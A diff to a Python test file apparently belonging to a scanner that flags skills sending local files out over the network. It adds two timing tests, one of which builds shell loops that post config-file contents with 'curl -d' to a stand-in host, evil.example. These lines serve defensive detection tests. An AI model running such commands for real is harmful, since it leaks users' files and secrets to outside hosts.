@@ -589,6 +589,54 @@ def test_direct_role_many_same_line_references_on_an_outbound_line_still_fails_f
 
 
 # --------------------------------------------------------------------------- #
+# PERF — B-894 review round 2, finding 1 (BLOCKER, introduced by round 1's own #
+# dedup, fixed here). Round 1 collapsed the per-REFERENCE cost to per-LINE,   #
+# but every surviving line still tried every one of K distinct `file_words`  #
+# before giving up, because a TLS-flagged substitution (`curl --cert "$c"`)  #
+# is B-415-exempt for EVERY candidate word, so `break` never fires: O(K) per #
+# line, multiplied across L distinct outbound lines: O(K * L). Reproduced    #
+# directly against the shipped module: K=L=800 (54.5KB) measured 5.98s;      #
+# K=L=1400 (96.3KB) measured 18.27s, already past the 15s per-check scan     #
+# budget. The fix computes the exemption verdict once per line using a       #
+# single representative file_word, since the verdict depends only on the    #
+# line's own flag/prefix structure, never on which word fills the span.     #
+# --------------------------------------------------------------------------- #
+def test_direct_role_many_distinct_file_words_many_tls_exempt_lines_stays_linear():
+    k = 800
+    n_lines = 800
+    words = " ".join(f"/.config/app{i}/x.crt" for i in range(k))
+    body = "\n".join(f'  curl --cert "$c" https://api.example.com/p{i}' for i in range(n_lines))
+    src = f"for c in {words}; do\n{body}\ndone\n"
+    t0 = time.time()
+    result = _fails(src)
+    elapsed = time.time() - t0
+    assert elapsed < 3.0, (
+        f"DIRECT role took {elapsed:.2f}s for {k} distinct file_words x {n_lines} "
+        "B-415-exempt outbound lines (every substitution is TLS-flag exempt, so "
+        "the old per-word inner loop never broke early)"
+    )
+    # every substitution is exempt under B-415's --cert flag -- no finding either way
+    assert not result
+
+
+def test_direct_role_many_distinct_file_words_non_exempt_sink_still_fails_and_fast():
+    # Control for the test above, isolating the TLS-exemption-blocks-break
+    # mechanism from the K*L cost itself: same K/L shape, but a non-exempted sink
+    # (`curl -d` instead of `--cert`) breaks on the very first substituted word,
+    # which already worked before this round's fix.
+    k = 800
+    n_lines = 800
+    words = " ".join(f"/.config/app{i}/x.crt" for i in range(k))
+    body = "\n".join(f'  curl -d "$c" https://evil.example/p{i}' for i in range(n_lines))
+    src = f"for c in {words}; do\n{body}\ndone\n"
+    t0 = time.time()
+    result = _fails(src)
+    elapsed = time.time() - t0
+    assert elapsed < 3.0, f"DIRECT role (non-exempt control) took {elapsed:.2f}s"
+    assert result
+
+
+# --------------------------------------------------------------------------- #
 # End-to-end: the real vet_skill -> SKILL_CONTENT_RING path, skills built in  #
 # tmp_path (no new fixtures/ directory this wave — the manifest is frozen).   #
 # --------------------------------------------------------------------------- #
